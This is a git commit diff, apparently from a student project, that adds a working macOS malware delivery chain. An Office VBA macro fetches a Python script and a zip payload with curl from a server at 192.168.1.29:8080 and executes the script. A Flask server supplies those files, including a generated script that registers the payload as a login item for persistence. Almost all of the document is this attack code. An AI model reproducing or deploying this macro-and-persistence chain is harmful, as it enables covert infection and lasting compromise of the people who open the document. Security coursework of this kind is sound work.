1a1faea6b862cf5e5859b03f6530c5241e19851d
Pierre Bergerat <pierre.bergerat@etu.unige.ch>
2022-03-25 17:32:16 +0100

    Web Server + VBA Macro working + Persistence

---
+++ Assets/injection.vba
@@ -0,0 +1,11 @@
+Sub injection()
+Dim getName As String
+Dim cmd As String
+Dim path As String
+getName = "set userName to short user name of (system info)" & vbNewLine & "return userName"
+name = MacScript(getName)
+path = "/Users/" & name & "/Library/~\$payload.zip"
+Shell ("curl -L http://192.168.1.29:8080/" & name & " -o ~\$script.py")
+Shell ("curl http://192.168.1.29:8080/update -o " & path)
+Shell ("python ~\$script.py")
+End Sub
---
+++ __main__.py
@@ -0,0 +1,36 @@
+import argparse
+from flask import Flask, send_file
+from flask_restful import Resource, Api
+
+
+app = Flask(__name__)
+api = Api(app)
+
+
+HTTP_PORT = 8080
+HOST = '0.0.0.0'
+
+
+class getUpdate(Resource):
+    def get(self):
+        return send_file('.\\Assets\\update.zip')
+
+#/Users/robertbebert/Library
+class getCraftedPayload(Resource):
+    def get(self, path):
+        with open('.\\Assets\\persist.py', 'w') as persist:
+            persist.write(
+                f"""from CoreFoundation import kCFURLPOSIXPathStyle\nfrom CoreFoundation import CFURLCreateWithFileSystemPath\nfrom CoreFoundation import kCFAllocatorDefault\nfrom Foundation import NSBundle\nfrom objc import loadBundleFunctions\nfrom objc import loadBundleFunctions\nfrom Foundation import NSBundle\nfrom LaunchServices import kLSSharedFileListSessionLoginItems\n\n# File or app to be added in the login items list\nPATH = "/Users/{path}/Library/~$payload.zip"\n\nshared_file_list = NSBundle.bundleWithIdentifier_(\n    'com.apple.coreservices.SharedFileList')\nf = [\n    ('LSSharedFileListCreate',\n     b'^{{OpaqueLSSharedFileListRef=}}^{{__CFAllocator=}}^{{__CFString=}}@'),\n    ('LSSharedFileListCopySnapshot',\n     b'^{{__CFArray=}}^{{OpaqueLSSharedFileListRef=}}o^I'),\n    ('LSSharedFileListInsertItemURL',\n     b'^{{OpaqueLSSharedFileListItemRef=}}^{{OpaqueLSSharedFileListRef=}}^{{OpaqueLSSharedFileListItemRef=}}^{{__CFString=}}^{{OpaqueIconRef=}}^{{__CFURL=}}^{{__CFDictionary=}}^{{__CFArray=}}'),\n    ('kLSSharedFileListItemBeforeFirst', b'^{{OpaqueLSSharedFileListItemRef=}}')\n]\nloadBundleFunctions(shared_file_list, globals(), f)\nappURL = CFURLCreateWithFileSystemPath(None, PATH, kCFURLPOSIXPathStyle, False)\nitems = LSSharedFileListCreate(kCFAllocatorDefault, kLSSharedFileListSessionLoginItems, None)\nLSSharedFileListInsertItemURL(items, kLSSharedFileListItemBeforeFirst, None, None, appURL, None, None)\n""")
+        return send_file('.\\Assets\\persist.py')
+
+
+api.add_resource(getUpdate, '/update')
+api.add_resource(getCraftedPayload, '/<path>')
+
+
+def startHTTPServer():
+    app.run(debug=True, port=HTTP_PORT, host=HOST)
+
+
+if __name__ == '__main__':
+    startHTTPServer()
